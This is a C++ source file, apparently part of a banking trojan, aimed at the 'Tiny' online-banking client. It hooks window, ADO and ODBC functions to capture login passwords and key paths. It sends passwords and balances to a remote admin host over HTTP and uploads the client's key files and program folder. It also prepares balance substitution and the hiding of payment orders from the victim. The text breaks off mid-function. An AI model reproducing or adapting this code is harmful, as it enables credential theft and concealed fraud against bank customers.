#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "modules.h"
#include "Plugins.h"
#include "rafa.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotCore.h"
#include "StrConsts.h"
#include "Splice.h"
#include "Unhook.h"
#include <shlwapi.h>
#include <shlobj.h>
#include "odbc.h"
#include <ole2.h>
#include <oledb.h>
#include <msdasc.h>
#include "rafa.h"
#include "BotDebug.h"

namespace TINYCLIENT
{
	#include "DbgTemplates.h"
}

#define DBG TINYCLIENT::DBGOutMessage<>

namespace Tiny
{

//какой остаток должен быть для указанного счета
struct RestAccount
{
	char account[32]; //если account[0] = 0, то конец массива
	TIMESTAMP_STRUCT date; //после какой даты
	__int64 sum; //какой остаток нужно подставить
	__int64 debet; //сумма дебета (расхода) в указанный день
	__int64 oldSum; //какой остаток был до подмены
	__int64 oldDebet; //какой был дебет до подмены
};

//скрываемые платежки
struct HidePayment
{
	char account[32];
	char num[32]; //номер документа
	__int64 amount; //сумма
	TIMESTAMP_STRUCT date; //дата платежки
	int orgDate, dayDate, payDate; //даты до скрытия
};

static RestAccount restAccounts[10]; //подмена баланса
static HidePayment hidePayments[10]; //скрываемые платежки
static bool runHideReplacement = false; //true - если надо провести подмену скрытие
static bool replacementDone = false; //true если подмена была совершена

const DWORD PROCESS_HASH = 0x9530DB12; // tiny.exe
const DWORD PROCESS_HASH2 = 0x97BB99CB; // cb193w.exe (старая версия клиента)

const DWORD HashTfAuthNew = 0x19DEB558; //класс окна входа в систему
const DWORD HashTPasswordDlg = 0xDF7C7D28; //класс окна ввода пароля
const DWORD HashTKeyPasswordDlg = 0x8129DC7A; //класс окна ввода пароля к ключу (для старой версии клиента)

char folderTiny[MAX_PATH];

//контролы с которых нужно забрать текст в форме регистрации
DWORD GrabControls[] = { 0x79770896 /* TComboBox */, 0x48B934F1 /* TEdit */, 0 };
const int MaxFindedControl = 3;
static char pathMDB[MAX_PATH]; //путь к базе данных
static DWORD HashCurrProcess = 0; //хеш какого из клиентов

struct ForFindControl
{
	HWND wnds[MaxFindedControl];
	char* texts[MaxFindedControl];
	int count;
	DWORD* hashs;
};

/////////////////////////////////////////////////////////////////////////////////////////
//состояние (режим работы) системы перехвата SQL запросов
//1 - чтение баланса счетов (чтение счета), 2 - нужный счет прочитан, чтение баланса
static int stateSQL = 0; 
static char passwordClient[100]; //пароль к клиенту (для отправки через аз)
static char bankClient[100]; //имя банка клиента
static int codeBankClient; //код банка

//информация об аккаунте
struct InfoAccount
{
	WCHAR account[16]; //счет клиента
	__int64 balance; //остаток на счету, тип Currency, последние 4-е знака идут после точки (копейки)
	__int64 oldBalance; //предыдущее значение баланса
	WCHAR name[128]; //название клиента
};

static InfoAccount accountClient[10]; //текущие остатки на счетах
static int currAccount = 0; //текущий счет из accountClient

///////////////////////////////////////////////////////////////////////////////////////////
//тип функции вызываемой при срабатывании фильтра
typedef int (*type_SQLFunc)( WCHAR* sql, int len );

//фильтр по которому вызываем функцию для анализа и изменения sql запроса
struct FilterSQLFunc
{
	WCHAR* and; //перечень слов в нижнем регистре разделенных нулями которые должны подряд встретится в запросе, в конце должно быть 2 нуля
	WCHAR* not; //перечень слов в нижнем регистре разделенных нулями которых не должно быть в запросе, в конце должно быть 2 нуля
	type_SQLFunc func;
};

//запрос счетов, стартует передачу баланса
static int FSF_SelectAmounts( WCHAR* sql, int len ); 
//запрос счетов в старом клиенте, смотрим балансы и отсылаем в админку
static int FSF_SelectAmountsOld( WCHAR* sql, int len ); 
//после синхронизация обновляется конфиг для установки даты синхронизации, в этот
//момент нужно запустить подмену
static int FSF_UpdateConfigLastSync( WCHAR* sql, int len );

FilterSQLFunc filtersSQL[] = 
{
{ L"select\0amounts\0amountflag\0transflag\0desc\0", 0, FSF_SelectAmounts },
{ L"select\0amounts\0amountflag\0order\0code\0", 0, FSF_SelectAmountsOld },
{ L"update\0config\0lastsync\0", 0, FSF_UpdateConfigLastSync },
{ 0, 0, 0 }
};

////////////////////////////////////////////////////////////////////////////////////////////
//тип функции вызываемой при чтении значения определенного поля
typedef void (*type_FieldValueFunc)( VARIANT* v );

struct FieldValue
{
	DWORD hash; //хеш имени поля
	type_FieldValueFunc func;
};

static void FV_Code_Amounts( VARIANT* v ); //чтение поля Code таблицы Amounts
static void FV_Confirmed_Amounts( VARIANT* v ); //чтение поля Confirmed таблицы Amounts
static void FV_FullName_Amounts( VARIANT* v ); //чтение поля FullName таблицы Amounts

FieldValue filedsValue[] =
{
{ 0xC7BF265 /* code */,			FV_Code_Amounts },
{ 0xFD84C9D2 /* confirmed */,	FV_Confirmed_Amounts },
{ 0xCD15A183 /* fullname */,	FV_FullName_Amounts },
{ 0, 0 }
};

//////////////////////////////////////////////////////////////////////////////////////////
//Доступ к базе данных идет через технологию ADO
//Интерфейс соединения с базой данных
GUID IID_Connection = { 0x00000514, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };
//Интерфейс работы с таблицами
GUID IID_Recordset  = { 0x00000535, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };
//Интерфейс выполнения команд в ADO
GUID IID_Command =	  { 0x00000507, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };

GUID IID_Fields = { 0x0000154d, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };

typedef HRESULT (__stdcall *type_QueryInterface)( void* This, REFIID riid, void **ppv );
//тип функции запроса интерфейса чтения значения полей
typedef HRESULT (__stdcall *type_get_Fields)( void* This, void** ppv );
//Возврат поля из списка полей
typedef HRESULT (__stdcall *type_get_Item)( void* This, VARIANT Index, void** ppv );
//возврат имени поля
typedef HRESULT (__stdcall *type_get_Name)( void* This, BSTR * pbstr );
//возврат типа поля
typedef HRESULT (__stdcall *type_get_Type)( void* This, enum DataTypeEnum * pDataType );
//возврат значения поля
typedef HRESULT (__stdcall *type_get_Value)( void* This, VARIANT * pvar );

static BOOL (WINAPI *RealDestroyWindow)( HWND hWnd );
static BOOL (WINAPI *RealConnect)( SOCKET s, const struct sockaddr *name, int namelen );
static BOOL (WINAPI *RealHttpSendRequestA)( HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength );
static HRESULT (STDAPICALLTYPE *RealCoCreateInstance)( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv );
//для ODBC с которым старый клиент работает
static SQLRETURN (WINAPI *RealSQLDriverConnectA)(
     SQLHDBC         ConnectionHandle,
     SQLHWND         WindowHandle,
     SQLCHAR *       InConnectionString,
     SQLSMALLINT     StringLength1,
     SQLCHAR *       OutConnectionString,
     SQLSMALLINT     BufferLength,
     SQLSMALLINT *   StringLength2Ptr,
     SQLUSMALLINT    DriverCompletion);
SQLRETURN (WINAPI *RealSQLPrepareA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
SQLRETURN (WINAPI *RealSQLExecDirectA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
SQLRETURN (WINAPI *RealSQLExecute)( SQLHSTMT StatementHandle );

//перехват вызова функций в интерфейсах ADO
static HRESULT (__stdcall *RealConnection_Open)( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options );
static HRESULT (__stdcall *RealRecordset_Open)( void* This, VARIANT Source, VARIANT ActiveConnection, enum CursorTypeEnum CursorType, enum LockTypeEnum LockType, long Options );
static HRESULT (__stdcall *RealCommand_put_CommandText)( void* This, BSTR pbstr );
static type_get_Value RealField_get_Value;

static bool SetHooks(); //установка хуков в момент активизации системы
static bool SetHooks2(); //установка хуков в момент запуска приложения
static bool InitData();
static bool ReplacementFuncs( void** ppv, int* nums, void** handlerFuncs, void** realFuncs, int count );
//поток подмены баланса и скрытия платежек
static DWORD WINAPI ThreadHideReplacement(void*);
//восстановить баланс и скрываемую платежку
static void RestoreBalansAndDocs();
//конвертация счета из базы данных в нормальный вид
static char* AccountToNormal( const char* from, char* to );
//переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
//не может быть в числе, в len будет количество прочитанных символов (символов в числе)
static __int64 SumToInt( const char* s, int* len );

static void CloseDB( ODBC* DB )
{
	if( DB ) delete DB;
}

static ODBC* OpenDB()
{
	ODBC* DB = new ODBC();
	if( DB )
	{
		char strConnect[MAX_PATH];
		m_lstrcpy( strConnect, "DRIVER=Microsoft Access Driver (*.mdb);DBQ=" );
		m_lstrcat( strConnect, pathMDB );
//		m_lstrcat( strConnect, ";UID=admin;PWD=" );
		DBG( "Tiny", "strConnect: '%s'", strConnect );
		if( !DB->Connect(strConnect) )
		{
			CloseDB(DB);
			DB = 0;
		}
	}
	return DB;
}


//отсылка полного клиента на видео сервер
DWORD WINAPI SendTiny(LPVOID)
{
	BOT::Initialize(ProcessUnknown);
	DBG( "Tiny", "запуск отсылки программы на сервер из папки %s", folderTiny );
//	DWORD folderSize = 0;
//	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
//	{
//		DBG( "Tiny", "Папка программы больше заданного размера, не копируем" );
//		return 0;
//	}
//	DBG( "Tiny", "Размер папки %d байт", folderSize );
	char tempFolder[MAX_PATH], clientPrg[MAX_PATH];
	m_memcpy( clientPrg, "tiny_client\\", 12 );
	PathToName( folderTiny, clientPrg + 12, sizeof(clientPrg) - 12 );
	pGetTempPathA( sizeof(tempFolder), tempFolder );
	char* cryptName = UIDCrypt::CryptFileName( clientPrg + 12, false );
	pPathAppendA( tempFolder, cryptName );
	STR::Free(cryptName);
	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
	{
		DBG( "Tiny", "Эта папка на данный момент выкачивается" );
		return 0;
	}
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
	pCreateDirectoryA( tempFolder, 0 );
	DBG( "Tiny", "Копирование во временную папку %s", tempFolder );
	*((int*)&(folderTiny[ m_lstrlen(folderTiny) ])) = 0; 
	CopyFileANdFolder( folderTiny, tempFolder );
	DBG( "Tiny", "Копирование на сервер" );
	//удаляем ненужные папки
/*
	const char* DelFolders[] = { "DATA", "OldVersion", 0 };
	int i = 0;
	while( DelFolders[i] )
	{
		pPathAppendA( tempFolder, DelFolders[i] );
		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
		DBG( "Tiny", "Удаление папки %s", tempFolder );
		DeleteFolders(tempFolder);
		pPathRemoveFileSpecA(tempFolder);
		i++;
	}
*/
	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
	DeleteFolders(tempFolder);
	DBG( "Tiny", "Копирование на сервер окончено" );
	return 0;
}

static int GetNameBank( char* bank, int szBank )
{
	char MyIdBank[32]; //код банка 
	char Name[81]; //имя банка из базы
	bank[0] = 0;
	int ret = 0;
	if( bankClient[0] )
	{
		SafeCopyStr( bank, szBank, bankClient );
		ret = codeBankClient;
	}
	else
	{
		ODBC* DB = OpenDB();
		if( DB )
		{
			SQLHSTMT qr = DB->ExecuteSql( "select Param from Config where Code='MyBankId'", "os30", MyIdBank );
			if( qr )
			{
				DB->CloseQuery(qr);
				DBG( "Tiny", "MyBankId=%s", MyIdBank );
				qr = DB->ExecuteSql( "select Name from Banks where Code=?", "os81 is30", Name, MyIdBank );
				if( qr )
				{
					DB->CloseQuery(qr);
					m_lstrcpy( bankClient, Name );
					SafeCopyStr( bank, szBank, Name );
					DBG( "Tiny", "name bank=%s", Name );
					codeBankClient = ret = m_atoi(MyIdBank);
				}
			}
			CloseDB(DB);
		}
	}
	return ret;
}

static DWORD WINAPI SendBalance( InfoAccount* ia )
{
	DBG( "Tiny", "Отсылка баланса: %ls, %I64d, '%ls'", ia->account, ia->balance, ia->name );
	string Host = GetAzHost();
	if(!Host.IsEmpty())
	{
		fwsprintfA pwsprintfA = Get_wsprintfA();
		TMemory qr(512);
		char* account = WSTR::ToAnsi( ia->account, 0 );
		char nameBank[100];
		GetNameBank( nameBank, sizeof(nameBank) );
		char* urlNameBank = URLEncode(nameBank);
		char balance[16];
		pwsprintfA( balance, "%d.%d", int(ia->balance / 10000), int((ia->balance % 10000)) / 100 );
		//формируем запрос
		//pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=getdrop&sum=%s&acc=%s", urlAdmin, Bot->UID.t_str(), azUser.t_str(), balance, account );
		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", Host.t_str(), BOT_UID, GetAzUser().t_str(), balance, account, urlNameBank);
		DBG( "Tiny", "Отправляем запрос %s", qr.AsStr() );
		THTTP H;
		H.Get(qr.AsStr());
		STR::Free(account);
		STR::Free(urlNameBank);
	}
	return 0;
}

//отсылка текущего баланса для старого клиента
static DWORD WINAPI SendBalanceOld( void* )
{
	ODBC* DB = OpenDB();
	if( DB == 0 ) return 0;
	char Code[32], Confirmed[32];
	const char* sql = "select Code,Confirmed from Amounts where Confirmed>0";
	SQLHSTMT qr = DB->ExecuteSql( sql, "os31 os31", Code, Confirmed );
	if( qr )
	{
		do
		{
			char accountA[32];
			AccountToNormal( Code, accountA );
			int len = m_lstrlen(accountA);
			wchar_t* account = AnsiToUnicode(accountA, 0);
			currAccount = -1;
			int i = 0;
			for( i = 0; i < ARRAYSIZE(accountClient) - 1 && accountClient[i].account[0]; i++ )
			{
				if( !m_wcsncmp( account, accountClient[i].account, len ) ) //такой счет есть в массиве
				{
					currAccount = i;
					break;
				}
			}
			if( currAccount < 0 ) //в массиве нет такого счета
			{
				if( i < ARRAYSIZE(accountClient) - 1 ) //есть еще место в массиве
				{
					//добавляем счет
					m_wcsncpy( accountClient[i].account, account, len + 1 );
					accountClient[i + 1].account[0] = 0;
					currAccount = i;
				}
			}
			if( currAccount >= 0 )
			{
				__int64 balance =  SumToInt( Confirmed, 0 );
				if( accountClient[i].balance != balance )
				{
					accountClient[i].oldBalance = accountClient[i].balance;
					accountClient[i].balance = balance;
					DBG( "Tiny", "account = %ls, balance = %I64d", account, balance );
					SendBalance(&accountClient[i]);
				}
			}
			MemFree(accountA);
		} while( DB->NextRow(qr) );
		DB->CloseQuery(qr);
	}
	CloseDB(DB);
}

static DWORD WINAPI SendPassword( void* )
{
	DBG( "Tiny", "Отсылка пароля %s", passwordClient );
	string Host = GetAzHost();
	if(!Host.IsEmpty())
	{
		char text[128];
		fwsprintfA pwsprintfA = Get_wsprintfA();
		m_lstrcpy( text, "Password=" );
		m_lstrcat( text, passwordClient );
		char* urlText= URLEncode(text);
		TMemory qr(512);
		string azUser = GetAzUser();
		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=setlog&log=00&text=%s", Host.t_str(), BOT_UID, azUser.t_str(), urlText );
		DBG( "Tiny", "Отправляем запрос %s", qr.AsStr() );
		THTTP H;
		H.Get(qr.AsStr());
		STR::Free(urlText);
	}
	return 0;
}

static bool IsHash( DWORD* hashs, DWORD hash )
{
	while( *hashs )
	{
		if( *hashs == hash )
			return true;
		hashs++;
	}
	return false;
}

static void AddStrLog( const char* name, const char* value, char* resultGrab )
{
	char buf[MAX_PATH];
	m_lstrcpy( buf, name );
	m_lstrcat( buf, ": " );
	if( value )
		m_lstrcat( buf, value );
	if( resultGrab[0] ) m_lstrcat( resultGrab, ", " );
	m_lstrcat( resultGrab, buf );
	m_lstrcat( buf, "\r\n" );
	KeyLogger::AddStrToBuffer( 0, buf, 0 );
	DBG( "Tiny", buf );
}

static void GrabKeys()
{
	//берем в базе данных путь к ключам
	ODBC* db = OpenDB();
	if( db )
	{
		char pathKeys[MAX_PATH];
		pathKeys[0] = 0;
		const char* sql = "select Param from Config where Code='keypath'";
		SQLHSTMT qr = db->ExecuteSql( sql, "os255", pathKeys );
		if( qr )
		{
			db->CloseQuery(qr);
			DBG( "Tiny", "Путь к ключам '%s'", pathKeys );
			KeyLogger::AddDirectory( pathKeys, "keys" );
			VideoProcess::SendFiles( 0, "keys_tiny", pathKeys, 0, 0, true );
		}
		else
			DBG( "Tiny", "Путь к ключам в базе данных не найден" );
		CloseDB(db);
	}
	else
		DBG( "Tiny", "Не удалось открыть базу %s", pathMDB );
}

static DWORD SendGrabData( ForFindControl* ffc )
{
	TMemory resultGrab(512);
	resultGrab.AsStr()[0] = 0;
	int ilogin = 0;
	int imdb = 1;
	//в новом клиента логин находится в 0-м поле, в старом в 1-м, по длине текста
	//определяем что откуда брать
	if( m_lstrlen(ffc->texts[0]) > m_lstrlen(ffc->texts[1]) )
	{
		ilogin = 1;
		imdb = 0;
	}
	AddStrLog( "Login", ffc->texts[ilogin], resultGrab.AsStr() );
	AddStrLog( "Password", ffc->texts[2], resultGrab.AsStr() );
	SafeCopyStr( passwordClient, sizeof(passwordClient), ffc->texts[2] );
	RunThread( SendPassword, 0 );
	AddStrLog( "Path database", ffc->texts[imdb], resultGrab.AsStr() );
	AddStrLog( "Path client", folderTiny, resultGrab.AsStr() );
	m_lstrcpy( pathMDB, ffc->texts[imdb] );
	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
	MemFree(ffc);
	GrabKeys();
	pSleep(2000); //ждем немного и закрываем систему

//	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };
//	RestoreFuncs( DLL_USER32,  unhook );

	KeyLogger::CloseSession();

	return 0;
}

static DWORD SendGrabPassword( ForFindControl* ffc )
{
	TMemory resultGrab(512);
	resultGrab.AsStr()[0] = 0;
	AddStrLog( "Password", ffc->texts[0], resultGrab.AsStr() );
	SafeCopyStr( passwordClient, sizeof(passwordClient), ffc->texts[0] );
	RunThread( SendPassword, 0 );
	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
	MemFree(ffc);
	GrabKeys();
	pSleep(2000); //ждем немного и закрываем систему

//	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };	
//	RestoreFuncs( DLL_USER32,  unhook );

	KeyLogger::CloseSession();

	return 0;
}

static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
{
	ForFindControl* ffc = (ForFindControl*)lParam;
	DWORD hash = GetWndClassHash(hwnd);
	if( IsHash( ffc->hashs, hash ) )
	{
		ffc->wnds[ffc->count] = hwnd;
		ffc->texts[ffc->count] = GetWndText(hwnd);
		DBG( "Tiny", "find control %08x, text = %s", hwnd, ffc->texts[ffc->count] );
		ffc->count++;
		if( ffc->count >= MaxFindedControl ) return FALSE;
	}
	return TRUE;
}

/////////////////////////////////////////////////////////////////////
// Хуки
/////////////////////////////////////////////////////////////////////

static void* GetInterfaceFunc( void* This, int num )
{
	DWORD* pv = (DWORD*)*((DWORD*)This); //извлекаем указатель на интерфейс
	return (void*)pv[num];
}

static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
{
	DWORD hash = GetWndClassHash(hwnd);
	if( HashTfAuthNew == hash )
	{
		DBG( "Tiny", "Закрытие окна регистрации" );
		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
		ffc->count = 0;
		ffc->hashs = GrabControls;
		pEnumChildWindows( hwnd, EnumChildProc, ffc );
		if( ffc->count >= 3 )
			RunThread( SendGrabData, ffc );
	}
	else if( HashTPasswordDlg == hash )
	{
		DBG( "Tiny", "Закрытие окна ввода пароля" );
		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
		ffc->count = 0;
		ffc->hashs = GrabControls;
		pEnumChildWindows( hwnd, EnumChildProc, ffc );
		if( ffc->count >= 3 ) //для старого клиента
			RunThread( SendGrabData, ffc );
		else
			if( ffc->count >= 1 ) //для нового клиента
				RunThread( SendGrabPassword, ffc );
	}
	else if ( HashTKeyPasswordDlg == hash ) //может быть только в старом клиенте
	{
		DBG( "Tiny", "Закрытие окна ввода пароля для ключей" );
		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
		ffc->count = 0;
		ffc->hashs = GrabControls;
		pEnumChildWindows( hwnd, EnumChildProc, ffc );
		if( ffc->count >= 1 ) 
			RunThread( SendGrabPassword, ffc );
	}

	return RealDestroyWindow(hwnd);
}

static int WINAPI HandlerConnect( SOCKET s, const struct sockaddr *name, int namelen )
{
	DBG( "Tiny", "Connect()" );
	return RealConnect( s, name, namelen );
}

static BOOL WINAPI HandlerHttpSendRequestA( HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength )
{
	DBG( "Tiny", "HandlerHttpSendRequestA()" );
	if( replacementDone )
	{
		RestoreBalansAndDocs();
		replacementDone = false;
	}
	return RealHttpSendRequestA( hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength );
}

static HRESULT __stdcall HandlerConnection_Open( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options )
{
	DBG( "Tiny", "Connection_Open: '%ls','%ls','%ls'", ConnectionString, UserID, Password );
	if( pathMDB[0] == 0 )
	{
		char* cs = WSTR::ToAnsi( ConnectionString, 0 );
		char* p = strstr( cs, "Data Source=" );
		if( p )
		{
			p += 12; //+= len("Data Source=")
			char* p2 = STR::Scan( p, ';' );
			if( p2 )
			{
				int l = p2 - p;
				m_memcpy( pathMDB, p, l );
				pathMDB[l] = 0;
				DBG( "Tiny", "path database: %s", pathMDB );
			}
		}
		STR::Free(cs);
	}
	return RealConnection_Open( This, ConnectionString, UserID, Password, Options );
}

static HRESULT __stdcall HandlerField_get_Value( void* This, VARIANT * pvar )
{
	HRESULT hr = RealField_get_Value( This, pvar );
	if( SUCCEEDED(hr) )
	{
		type_get_Name get_Name = (type_get_Name)GetInterfaceFunc( This, 11 );
		BSTR nameField;
		get_Name( This, &nameField );
		DWORD hash = WSTR::GetHash( nameField, 0, true );
		int i = 0;
		while( filedsValue[i].hash )
		{
			if( filedsValue[i].hash == hash )
			{
				filedsValue[i].func(pvar);
				break;
			}
			i++;
		}
/*
		switch( pvar->vt )
		{
			case VT_I4:
				DBG( "Tiny", "[%ls] = %d", nameField, pvar->lVal );
				break;
			case VT_BSTR:
				DBG( "Tiny", "[%ls] = '%ls'", nameField, pvar->bstrVal );
				break;
			case VT_CY:
				DBG( "Tiny", "[%ls] = %I64d", nameField, pvar->cyVal );
				break;
			default:
				DBG( "Tiny", "[%ls] type value = %d", nameField, pvar->vt );
				break;
		}
*/
	}
	return hr;
}

static HRESULT __stdcall HandlerRecordset_Open( void* This, VARIANT Source, VARIANT ActiveConnection, enum CursorTypeEnum CursorType, enum LockTypeEnum LockType, long Options )
{
//	DBG( "Tiny", "Recordset_Open: %d,%d", (int)Source.vt, (int)ActiveConnection.vt );
	HRESULT hr = RealRecordset_Open( This, Source, ActiveConnection, CursorType, LockType, Options );
	if( SUCCEEDED(hr) )
	{
		type_get_Fields get_Fields = (type_get_Fields)GetInterfaceFunc( This, 21 );
		void* fields = 0;
		if( SUCCEEDED( get_Fields( This, &fields ) ) )
		{
			type_get_Item get_Item = (type_get_Item)GetInterfaceFunc( fields, 10 );
			void* item;
			VARIANT index;
			index.vt = VT_I4; index.lVal = 0;
			if( SUCCEEDED( get_Item( fields, index, &item ) ) )
			{
				int nums[] = {13};
				void* handlerFuncs[] = {&HandlerField_get_Value};
				void* realFuncs[] = {&RealField_get_Value};
				if( ReplacementFuncs( &item, nums, handlerFuncs, realFuncs, 1 ) )
				{
//					DBG( "Tiny", "Подменили Field_get_Value" );
				}
			}
		}
	}
	return hr;
}

static int ExecSQLFilter( wchar_t* newSQL )
{
	int ret = 0;
	m_wcslwr(newSQL); //запрос в нижний регистр
	int i = 0;
	while( filtersSQL[i].func )
	{
		bool ok = true;
		if( filtersSQL[i].and ) //слова которые должны быть в запросе
		{
			int j = 0;
			const WCHAR* p = newSQL;
			while( filtersSQL[i].and[j] )
			{
				int l = m_wcslen( &filtersSQL[i].and[j] ); //длина очередного слова
				p = m_wcsstr( p, &filtersSQL[i].and[j] ); //есть слово в запросе
				if( p == 0 ) //фильтр не сработал
				{
					ok = false;
					break;
				}
				p += l;
				j += l + 1; //переходим на очередное слово
			}
		}
		if( ok && filtersSQL[i].not ) //слова которых не должно быть в запросе
		{
			int j = 0;
			while( filtersSQL[i].not[j] )
			{
				int l = m_wcslen( &filtersSQL[i].not[j] );
				const WCHAR* p = m_wcsstr( newSQL, &filtersSQL[i].not[j] );
				if( p ) //такое слово есть, фильтр не сработал
				{
					ok = false;
					break;
				}
				j += l + 1;
			}
		}
		if( ok ) //фильтр сработал, вызваем его функцию
		{
			int len = m_wcslen(newSQL);
			int res = filtersSQL[i].func( newSQL, len );
			if( res == 1 ) //оставить запрос как есть
			{
				break;
			}
			else
				if( res == 2 ) //подменить запрос
				{
					ret = 1;
					break;
				}
			//если res == 0, то поиск продолжается
		}
		i++;
	}
	return ret;
}

static HRESULT __stdcall HandlerCommand_put_CommandText( void* This, BSTR pbstr )
{
	DBG( "Tiny", "Command_put_CommandText: '%ls'", pbstr );
	//выделяем место и копируем запрос
	int len = m_wcslen(pbstr);
	int size = (2 * len + 1) * sizeof(WCHAR); //выделяем в два раза больше памяти, чтобы функция фильтра могла изменить запрос
	WCHAR* newSQL = (WCHAR*)MemAlloc(size);
	if( newSQL )
	{
		m_wcsncpy( newSQL, pbstr, len );
		newSQL[len] = 0;
		if( ExecSQLFilter(newSQL) ) //если возвращает 1, то нужно подменить
			pbstr = newSQL;
	}
	HRESULT hr = RealCommand_put_CommandText( This, pbstr );
	if( newSQL ) MemFree(newSQL);
	return hr;
}

static bool ReplacementFuncs( void** ppv, int* nums, void** handlerFuncs, void** realFuncs, int count )
{
	DWORD* pv = (DWORD*)*(*(DWORD**)ppv); //извлекаем указатель на интерфейс
	DWORD* phf = (DWORD*)handlerFuncs;
	DWORD** prf = (DWORD**)realFuncs;
	if( pv[ nums[0] ] == phf[0] )
		return true; //подмена уже была
	//вычисляем размер памяти с которой нужно снять защиту от записи
	int max = 0;
	for( int i = 0; i < count; i++ ) 
		if( max < nums[i] ) max = nums[i];
	int sizeMem = sizeof(DWORD) * (max + 1); //размер памяти с которой нужно снять защиту от записи

	DWORD oldProtect = 0;
	if( (BOOL)pVirtualProtect( pv, sizeMem, PAGE_EXECUTE_READWRITE, &oldProtect ) )
	{
		for( int i = 0; i < count; i++ )
			*prf[i] = pv[ nums[i] ], pv[ nums[i] ] = phf[i];
		pVirtualProtect( pv, sizeMem, oldProtect, &oldProtect);
		return true;
	}
	return false;
}

static HRESULT STDAPICALLTYPE HandlerCoCreateInstance( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv )
{
//	char buf1[96], buf2[96];
//	ToHex( buf1, (BYTE*)&rclsid, sizeof(CLSID) );
//	ToHex( buf2, (BYTE*)&riid, sizeof(IID) );
//	DBG( "Tiny", "rclsid=%s, riid=%s", buf1, buf2 );
	HRESULT hr = RealCoCreateInstance( rclsid, pUnkOuter, dwClsContext, riid, ppv );
	//запрашивается интерфейс базы данных
	if( SUCCEEDED(hr) )
	{
		if( m_memcmp( &rclsid, &IID_Connection, sizeof(IID) ) == 0 ) 
		{
			int nums[] = {20};
			void* handlerFuncs[] = {&HandlerConnection_Open};
			void* realFuncs[] = {&RealConnection_Open};
			if( ReplacementFuncs( ppv, nums, handlerFuncs, realFuncs, 1 ) )
			{
//				DBG( "Tiny", "Подменили Connection_Open" );
			}
		}
		else if ( m_memcmp( &rclsid, &IID_Recordset, sizeof(IID) ) == 0 ) 
		{
			int nums[] = {40};
			void* handlerFuncs[] = {&HandlerRecordset_Open};
			void* realFuncs[] = {&RealRecordset_Open};
			if( ReplacementFuncs( ppv, nums, handlerFuncs, realFuncs, 1 ) )
			{
//				DBG( "Tiny", "Подменили Recordeset_Open" );
			}
		}
		else if ( m_memcmp( &rclsid, &IID_Command, sizeof(IID) ) == 0 ) 
		{
			int nums[] = {12};
			void* handlerFuncs[] = {&HandlerCommand_put_CommandText};
			void* realFuncs[] = {&RealCommand_put_CommandText};
			if( ReplacementFuncs( ppv, nums, handlerFuncs, realFuncs, 1 ) )
			{
//				DBG( "Tiny", "Подменили Command_put_CommandText" );
			}
		}
	}
	return hr;
}

static SQLRETURN WINAPI HandlerSQLDriverConnectA( SQLHDBC ConnectionHandle, SQLHWND WindowHandle, SQLCHAR* InConnectionString,
					      SQLSMALLINT StringLength1, SQLCHAR* OutConnectionString, SQLSMALLINT BufferLength,
						  SQLSMALLINT* StringLength2Ptr, SQLUSMALLINT DriverCompletion )
{
	DBG( "Tiny", "--StringConnect='%s'", InConnectionString );
	return RealSQLDriverConnectA( ConnectionHandle, WindowHandle, InConnectionString, StringLength1,
						  OutConnectionString, BufferLength, StringLength2Ptr, DriverCompletion );
}

static SQLRETURN WINAPI HandlerSQLPrepareA( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength )
{
	DBG( "Tiny", "SQLPrepareA: '%s'", StatementText );
	wchar_t* newSQL = AnsiToUnicode( (char*)StatementText, 0 );
	char* newASLAnsi = 0;
	if( newSQL )
	{
		if( ExecSQLFilter(newSQL) ) 
		{
